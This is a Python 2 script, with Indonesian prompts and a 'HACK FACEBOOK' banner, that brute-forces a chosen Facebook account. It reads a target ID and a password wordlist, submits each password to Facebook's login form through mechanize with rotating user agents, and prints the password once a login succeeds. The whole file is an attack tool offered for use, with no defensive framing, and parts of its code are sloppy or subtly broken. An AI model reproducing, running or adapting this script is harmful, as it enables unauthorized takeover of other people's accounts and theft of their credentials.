#-*- coding: UTF-8 -*-
# created by: Iqbalz Noobs
# Team : Life Of Programmer

import os
import sys
import time
import random
import cookielib
import mechanize


wd = "\033[90;1m" # White dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
	for noobs in s + '\n':
		sys.stdout.write(noobs)
		sys.stdout.flush()
		time.sleep(10. / 100)

def banner():
    os.system('clear')
    print """
                                                                                                           
"""
    runntxt(GL+"          Assalamu'@laikum. ^_^...")
#    time.sleep(1)
    print " "
    print GG+"  +=============================================+"
    print RR+"  |•••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
    print GG+"  +=============================================+"
    print WW+"  |          CREATED BY: IQBALZ NOOBS           |"
    print RR+"  |       Berdoa Dulu Sebelum Menggunakan       |"
    print WW+"  |            FACEBOOK: Iqbalznoobs            |"
    print Y+"  |              INSTAGRAM: IQBALZ5             |"
    print RR+"  |---------------------------------------------|"
    print GL+"  |         LIFE OF PROGRAMMER [ L.O.P ]        |"
    print RR+"  |---------------------------------------------|"
    print GG+"  +=============================================+"
    print RR+"  |•••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
    print GG+"  +=============================================+"

banner()

email_target = str(raw_input(GL+" Masukkan ID Target\033[33;1m: "))
password_list = str(raw_input(WW+" Masukkan File Wordlist \033[95m[ pass.txt ] \033[92;1m: "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragen_cuk = [('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1','Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36','Mozilla/5.0 (Windows 10; rv:41.0) Gecko/41.0 Firefox/41.0')]

def pil():
                print GG+" "
                g = str(raw_input("[?] Hack Fb lagi..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 brute.py')
                elif g == 'n' or g == 'N':
                    print wd+"Keluar dari program..."
                    sys.exit()
                else:
                    print RR+"Pilih yang bener cuk..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit wordlist cuk.? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"Keluar Dari Program..."
                sys.exit()

        else:
                print RR+"Pilih yg bener cuk..."
                edit_wordlist()

def iqbalz_brute(password_cuk):
   
     try:

	print (GG+"[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+password_cuk)
	sys.stdout.flush()
	noobs.addheaders = [('User-agent', random.choice(useragen_cuk))]
	site = noobs.open(login)
	noobs.select_form(nr = 0)
	noobs.form['email'] = email_target
	noobs.form['pass'] = password_cuk
	nol = noobs.submit()
	masuk = nol.geturl()
   
	if masuk != login and (not 'login_attempt' in masuk):
			print ("\033[96m                S U C C E S S")
			print "          P A S S W O R D  F I N D "
                        print RR+"+-------------------------------------------+"
			print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
                        print (RR+"#\033[97m Password Target:\033[92m {}").format(password_cuk)
                        print " "
                        raw_input(WW+"TEKAN ENTER UNTUK KELUAR...")
			sys.exit(1)
        
     except KeyboardInterrupt:
        print wd+'Kracking Berhenti..'
        edit_wordlist()  
        sys.exit()

def main():
	global noobs
	noobs = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	noobs.set_handle_robots(False)
	noobs.set_handle_redirect(True)
	noobs.set_cookiejar(cj)
	noobs.set_handle_equiv(True)
	noobs.set_handle_referer(True)
	noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

	runn_noobs()
	pass_noobs()
        edit_wordlist()
def pass_noobs():
	global password_cuk
	password_lol = open(password_list, 'r')
	for password_cuk in password_lol:
		password_lol = password_cuk
		iqbalz_brute(password_cuk)


def runn_noobs():
         global password_list
         nob = GG+"""
                       ```..```                          
                 .:/+osoo++++ooso+/:.                    
             `:+so/-.`          `.-/os+:`                
           -os/-`                    `-/s+-              
         :so-                            -os:            
       -oo-   `.``                  ``..   -oo.          
      /s/    `:---:-.``........``.-::--:-    /s/         
     +s-     -:`   `.--........---.`   -:     -s+        
    /s-      -:`                       -:      -s/       
   -s/      `-:`                       -:.      /s-      
   os`      :-`                         .:.     `s+      
  .s/      .:`                           :-      +s`     
  -s:      .:`                           -:      :s.     
  -s:      .:`                           --      :s-     
  `s/      `:-                          `:.      +s`     
   +o`      .-.                        `--      `o+      
   -s/       `--`                    `.-.       /s-      
    /o-  .---.``.--..````     ```..---.        -o/       
     /o- `.----`   ``--.      `--.``          -o/        
      :o/  `--.--.`..-.         --           /o:         
       .oo-  --.``..``          --         -o+.          
         :o+- `..-----`         --       -+o-            
           -+o/.`   .-`         --   `-/o+-              
              `-/o+:---`         -:-:+o/-`                
                  .-:/+o++++++++o+/:-.                    
                         ``````                           \033[91;1m

             Powered by:\033[97m Iqbalz Noobs                  
   \033[96;1mLife Of Programmer\033[91;1m
      
      """

         print nob
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
         print " "

if __name__=="__main__":
         main()
